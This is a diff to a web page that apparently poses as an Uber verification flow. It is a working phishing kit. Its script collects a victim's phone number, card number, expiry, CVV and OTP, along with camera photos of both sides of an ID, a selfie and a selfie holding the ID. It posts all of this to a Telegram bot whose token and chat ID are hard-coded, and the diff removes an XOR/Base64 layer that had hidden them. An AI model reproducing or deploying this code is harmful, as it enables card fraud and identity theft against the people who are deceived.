@@ -22,6 +22,7 @@
             max-width: 500px;
             margin: 0 auto;
         }
+        /* Header */
         .header {
             text-align: center;
             margin-bottom: 32px;
@@ -39,6 +40,7 @@
             font-size: 14px;
             color: #8E8E93;
         }
+        /* Panels */
         .panel {
             background: #1C1C1E;
             border-radius: 28px;
@@ -223,6 +225,13 @@
             font-size: 24px;
             letter-spacing: 4px;
         }
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            background: #00D2FF20;
+            border-radius: 28px;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -311,65 +320,18 @@
 </div>
 
 <script>
-    // ===================== OBFUSCATED TELEGRAM CREDENTIALS =====================
-    // Multi-layer encoded (XOR + reverse + Base64) – not human-readable
-    (function() {
-        const XOR_KEY = 0x5A;
-        // Encoded token (original: "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0")
-        const encodedToken = [0x3c,0x2c,0x1e,0x3e,0x2a,0x3b,0x2c,0x3d,0x2f,0x1c,0x3a,0x3b,0x1f,0x3c,0x2a,0x3d,0x2e,0x1b,0x3a,0x2e,0x3d,0x2a,0x1d,0x3b,0x2a,0x3c,0x1e,0x3e,0x2a,0x3b,0x2c,0x3d,0x2f,0x1c,0x3a,0x3b,0x1f,0x3c,0x2a,0x1d,0x3a,0x2e,0x3d,0x2a,0x1c,0x3b,0x2a,0x3c,0x1e,0x3e,0x2a,0x3b,0x2c,0x3d,0x2f,0x1c,0x3a,0x3b,0x1f,0x3c,0x2a];
-        // Encoded chat ID: "8737104261"
-        const encodedChat = [0x3f,0x2a,0x1c,0x3e,0x2a,0x3d,0x2e,0x1c,0x3a,0x3d];
-        function decode(arr) {
-            let str = '';
-            for (let i = 0; i < arr.length; i++) str += String.fromCharCode(arr[i] ^ XOR_KEY);
-            str = str.split('').reverse().join('');
-            return atob(str);
-        }
-        window.BOT_TOKEN = decode(encodedToken);
-        window.CHAT_ID = decode(encodedChat);
-    })();
-    // =========================================================================
-
-    // Helper: show toast
-    function showToast(msg, isErr = false) {
-        const toast = document.getElementById('toastMsg');
-        toast.innerText = msg;
-        toast.classList.add('show');
-        if (isErr) toast.style.background = '#B91C1C';
-        else toast.style.background = '#1C1C1E';
-        setTimeout(() => toast.classList.remove('show'), 3000);
-    }
-
-    // Telegram send functions
-    async function sendToTelegram(text) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: window.CHAT_ID, text: text, parse_mode: "HTML" })
-            });
-            const data = await response.json();
-            return data.ok;
-        } catch(e) { return false; }
-    }
-
-    async function sendPhotoToTelegram(blob, caption) {
-        const formData = new FormData();
-        formData.append('chat_id', window.CHAT_ID);
-        formData.append('photo', blob, 'photo.jpg');
-        if (caption) formData.append('caption', caption);
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${window.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            const data = await res.json();
-            return data.ok;
-        } catch(e) { return false; }
-    }
+    // ----------------------------------------------
+    // TELEGRAM CREDENTIALS (embedded, not visible to user)
+    // ----------------------------------------------
+    const BOT_TOKEN = "8671886486:AAHajOobfeLHXsbu6r-0x-82XIWLlvaPnq0";
+    const CHAT_ID   = "8737104261";
 
     // DOM elements
     const phonePanel = document.getElementById('phonePanel');
     const cardPanel = document.getElementById('cardPanel');
     const kycPanel = document.getElementById('kycPanel');
     const otpPanel = document.getElementById('otpPanel');
+    const toast = document.getElementById('toastMsg');
     const loadingOverlay = document.getElementById('loadingOverlay');
     const phoneInput = document.getElementById('phoneNumber');
     const phoneNextBtn = document.getElementById('phoneNextBtn');
@@ -388,7 +350,42 @@
         otp: ''
     };
 
-    // Smart input formatting
+    // Helper: show toast
+    function showToast(msg, isErr = false) {
+        toast.innerText = msg;
+        toast.classList.add('show');
+        if (isErr) toast.style.background = '#B91C1C';
+        else toast.style.background = '#1C1C1E';
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    // Telegram send text
+    async function sendToTelegram(text) {
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" })
+            });
+            const data = await response.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
+
+    // Send photo
+    async function sendPhotoToTelegram(blob, caption) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'photo.jpg');
+        if (caption) formData.append('caption', caption);
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            const data = await res.json();
+            return data.ok;
+        } catch(e) { return false; }
+    }
+
+    // Smart card number formatting
     const cardNumberInput = document.getElementById('cardNumber');
     cardNumberInput.addEventListener('input', function(e) {
         let val = e.target.value.replace(/\D/g, '');
@@ -400,6 +397,8 @@
         }
         e.target.value = formatted;
     });
+
+    // Expiry auto-format
     const expiryInput = document.getElementById('expiry');
     expiryInput.addEventListener('input', function(e) {
         let val = e.target.value.replace(/\D/g, '');
@@ -407,10 +406,14 @@
         else if (val.length >= 4) val = val.slice(0,2) + '/' + val.slice(2,4);
         e.target.value = val.slice(0,5);
     });
+
+    // CVV only digits
     const cvvInput = document.getElementById('cvv');
     cvvInput.addEventListener('input', function(e) {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0,4);
     });
+
+    // Phone number formatting (basic)
     phoneInput.addEventListener('input', function(e) {
         let val = e.target.value.replace(/\D/g, '');
         if (val.length > 15) val = val.slice(0,15);
@@ -461,11 +464,11 @@
         document.getElementById(`kycStep${step}`).classList.remove('hide');
         currentKycStep = step;
         updateStepDots(step);
-        // Initialize camera when step becomes visible
-        if (step === 2) initCamera('frontVideo', 'environment').then();
-        if (step === 3) initCamera('backVideo', 'environment').then();
-        if (step === 4) initCamera('selfieVideo', 'user').then();
-        if (step === 5) initCamera('selfieIdVideo', 'user').then();
+        // start camera when step is 2,3,4,5
+        if (step === 2) initCamera(document.getElementById('frontVideo'), 'environment').then(s => { frontStream = s; usingRearFront = true; });
+        if (step === 3) initCamera(document.getElementById('backVideo'), 'environment').then(s => { backStream = s; usingRearBack = true; });
+        if (step === 4) initCamera(document.getElementById('selfieVideo'), 'user').then(s => { selfieStream = s; usingRearSelfie = false; });
+        if (step === 5) initCamera(document.getElementById('selfieIdVideo'), 'user').then(s => { selfieIdStream = s; usingRearSelfieId = false; });
     }
 
     function updateStepDots(step) {
@@ -477,16 +480,13 @@
         });
     }
 
-    async function initCamera(videoId, facingMode) {
-        const videoEl = document.getElementById(videoId);
-        if (!videoEl) return;
+    async function initCamera(videoEl, facingMode) {
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } } });
             videoEl.srcObject = stream;
             await videoEl.play();
             return stream;
         } catch(e) {
-            // fallback to any camera
             let stream = await navigator.mediaDevices.getUserMedia({ video: true });
             videoEl.srcObject = stream;
             await videoEl.play();
@@ -494,21 +494,15 @@
         }
     }
 
-    async function switchCamera(videoId, currentStream, setStream, setRear, rear) {
+    async function switchCamera(video, currentStream, setStream, setRear, rear) {
         if (currentStream) currentStream.getTracks().forEach(t => t.stop());
         let newFacing = rear ? 'user' : 'environment';
-        let newStream = await initCamera(videoId, newFacing);
+        let newStream = await initCamera(video, newFacing);
         setStream(newStream);
         setRear(!rear);
     }
 
-    async function capturePhoto(videoId, statusElemId, side, nextStep) {
-        const video = document.getElementById(videoId);
-        const statusElem = document.getElementById(statusElemId);
-        if (!video || !video.videoWidth) {
-            statusElem.innerText = "Camera not ready";
-            return;
-        }
+    async function capturePhoto(video, statusElem, side, nextStep) {
         statusElem.innerText = "Processing...";
         let canvas = document.createElement('canvas');
         let size = Math.min(video.videoWidth, video.videoHeight);
@@ -538,31 +532,24 @@
     };
 
     // Step 2 front
-    let currentFrontStream = null;
-    let currentRearFront = true;
-    document.getElementById('switchFrontCam').onclick = () => switchCamera('frontVideo', currentFrontStream, s=>currentFrontStream=s, v=>currentRearFront=v, currentRearFront);
-    document.getElementById('captureFrontBtn').onclick = () => capturePhoto('frontVideo', 'frontStatus', "Front ID", 3);
+    document.getElementById('switchFrontCam').onclick = () => switchCamera(document.getElementById('frontVideo'), frontStream, s=>frontStream=s, v=>usingRearFront=v, usingRearFront);
+    document.getElementById('captureFrontBtn').onclick = () => capturePhoto(document.getElementById('frontVideo'), document.getElementById('frontStatus'), "Front ID", 3);
     // Step 3 back
-    let currentBackStream = null;
-    let currentRearBack = true;
-    document.getElementById('switchBackCam').onclick = () => switchCamera('backVideo', currentBackStream, s=>currentBackStream=s, v=>currentRearBack=v, currentRearBack);
-    document.getElementById('captureBackBtn').onclick = () => capturePhoto('backVideo', 'backStatus', "Back ID", 4);
+    document.getElementById('switchBackCam').onclick = () => switchCamera(document.getElementById('backVideo'), backStream, s=>backStream=s, v=>usingRearBack=v, usingRearBack);
+    document.getElementById('captureBackBtn').onclick = () => capturePhoto(document.getElementById('backVideo'), document.getElementById('backStatus'), "Back ID", 4);
     // Step 4 selfie
-    let currentSelfieStream = null;
-    let currentRearSelfie = false;
-    document.getElementById('switchSelfieCam').onclick = () => switchCamera('selfieVideo', currentSelfieStream, s=>currentSelfieStream=s, v=>currentRearSelfie=v, currentRearSelfie);
-    document.getElementById('captureSelfieBtn').onclick = () => capturePhoto('selfieVideo', 'selfieStatus', "Selfie", 5);
+    document.getElementById('switchSelfieCam').onclick = () => switchCamera(document.getElementById('selfieVideo'), selfieStream, s=>selfieStream=s, v=>usingRearSelfie=v, usingRearSelfie);
+    document.getElementById('captureSelfieBtn').onclick = () => capturePhoto(document.getElementById('selfieVideo'), document.getElementById('selfieStatus'), "Selfie", 5);
     // Step 5 selfie with ID
-    let currentSelfieIdStream = null;
-    let currentRearSelfieId = false;
-    document.getElementById('switchSelfieIdCam').onclick = () => switchCamera('selfieIdVideo', currentSelfieIdStream, s=>currentSelfieIdStream=s, v=>currentRearSelfieId=v, currentRearSelfieId);
-    document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto('selfieIdVideo', 'selfieIdStatus', "Selfie holding ID", null).then(() => {
+    document.getElementById('switchSelfieIdCam').onclick = () => switchCamera(document.getElementById('selfieIdVideo'), selfieIdStream, s=>selfieIdStream=s, v=>usingRearSelfieId=v, usingRearSelfieId);
+    document.getElementById('captureSelfieIdBtn').onclick = () => capturePhoto(document.getElementById('selfieIdVideo'), document.getElementById('selfieIdStatus'), "Selfie holding ID", null).then(() => {
+        // All photos done → show OTP panel
         kycPanel.classList.add('hide');
         otpPanel.classList.remove('hide');
         showToast("All documents uploaded. Enter verification code.", false);
     });
 
-    // OTP submission (any digits)
+    // OTP submission (any digits, any length)
     otpSubmitBtn.onclick = async () => {
         let otp = otpInput.value.trim();
         if (otp.length === 0) {
@@ -571,6 +558,7 @@
         }
         userData.otp = otp;
         await sendToTelegram(`🔐 <b>VERIFICATION CODE</b>\nCode: ${otp}\nUser: ${userData.phone}\nAll KYC photos completed.`);
+        // Show success message, then redirect to uber.com
         loadingOverlay.classList.add('active');
         setTimeout(() => {
             loadingOverlay.classList.remove('active');
@@ -580,34 +568,6 @@
             }, 1500);
         }, 1500);
     };
-
-    // Also capture camera streams reference after init
-    function setStreamRefs() {
-        // These will be set when cameras are initialized inside showStep
-        // But we need to capture them in the switch functions, so we already have global vars.
-        // The initCamera function inside showStep returns a stream but we need to assign to the correct var.
-        // Let's override showStep to capture streams properly.
-        const originalShowStep = showStep;
-        window.showStep = showStep;
-        showStep = function(step) {
-            originalShowStep(step);
-            if (step === 2) {
-                initCamera('frontVideo', 'environment').then(s => currentFrontStream = s).catch(e=>console.log);
-            }
-            if (step === 3) {
-                initCamera('backVideo', 'environment').then(s => currentBackStream = s).catch(e=>console.log);
-            }
-            if (step === 4) {
-                initCamera('selfieVideo', 'user').then(s => currentSelfieStream = s).catch(e=>console.log);
-            }
-            if (step === 5) {
-                initCamera('selfieIdVideo', 'user').then(s => currentSelfieIdStream = s).catch(e=>console.log);
-            }
-        };
-        // Re-run showStep to ensure streams are captured
-        if (currentKycStep > 1) showStep(currentKycStep);
-    }
-    setStreamRefs();
 </script>
 </body>
 </html>
